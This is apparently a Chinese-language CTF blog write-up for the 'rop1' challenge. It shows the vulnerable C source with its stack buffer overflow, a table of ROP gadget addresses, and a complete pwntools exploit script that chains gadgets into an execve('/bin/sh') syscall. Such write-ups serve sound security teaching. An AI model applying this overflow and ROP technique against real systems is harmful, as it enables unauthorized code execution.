---
title: lys rop1 Writes up
published: 2024-08-07
tags: [CTF]
category: Cyber Security
draft: false
image: 'image.png'
---

### Recon

file:
![image](https://hackmd.io/_uploads/ByhvUZbqR.png)

checksec:
![image](https://hackmd.io/_uploads/SJH9IbZcR.png)

source.c:

```c=
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

char name[0x100];

size_t readbuf(char *buf, size_t len)
{
    size_t i=0;
    while(i<len){
        if(read(0,&buf[i],1)!=1){
            break;
        }
        if(buf[i]=='\n'){
            buf[i] = 0;
            break;
        }
        i++;
    }
    return i;
}

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    //printf("Gift: ")
    printf("What is your name? ");
    readbuf(name, 0x100);
    printf("Hello, %s\n", name);
    char buf[0x10];
    printf("You have a buffer overflow vuln: ");
    readbuf(buf, 0x100);
    return 0;
}
```
我們發現在 ```"You have a buffer overflow vuln: "```的 buf 大小是 10 ，但是他用 readbuf(buf,0x100) 去讀，所以導致了 buffer overflow 的問題，再來，題目本身是 statically linked ， 所以我們可以很方便的去找 gadget 來用 owob

## exploit 

我們的目的是要執行 execve 這個 systemcall ，所以我們要達成下面的條件

|  暫存器   | 值  |
|  ----  | ----  |
| rax  | 0x3b |
| rdi  | '/bin/sh'的位置 |
| rsi  | 0 |
| rdx  | 0 |

經過一番尋找之後，我們成功湊齊了所有必要的 gadget ，但是有一個問題是 pop rdx 的gadget 不是那麼乾淨，那我們可以用 pop rdx ; pop rbx 去解決它 ， 最後一個問題是，我們該如何找到 name 也就是我們執行 '/bin/sh' 應該要有的位置， 其實只要用 ida 點下去那一個 function 就找到了 owob


![image](https://hackmd.io/_uploads/ByzK6ZZ90.png)


|  暫存器   | 值  |
|  ----  | ----  |
| rax  | 0x44fd87 |
| rdi  | 0x401f4f+name_addr |
| rsi  | 0x409f7e |
| rdx_rbx  | 0x485bab |
| syscall | 0x401d04|


exp.py:

``` py=
from pwn import *

context(arch="amd64")

r=process('./rop1')


p=''

name=p64(0x4C7300)
pop_rax=p64(0x000000000044fd87)+p64(0x3b)
pop_rdi=p64(0x0000000000401f4f)+name
pop_rsi=p64(0x0000000000409f7e)+p64(0x0)
pop_rdx_pop_rbx=p64(0x0000000000485bab)+p64(0x0)+p64(0x0)
syscall=p64(0x0000000000401d04)

p+=pop_rax+pop_rdi+pop_rsi+pop_rdx_pop_rbx+syscall

r.sendlineafter('?','/bin/sh')

r.sendlineafter(':','a'*0x18+p)

r.interactive()
```

### pwned!

![image](https://hackmd.io/_uploads/S10V5WWqR.png)

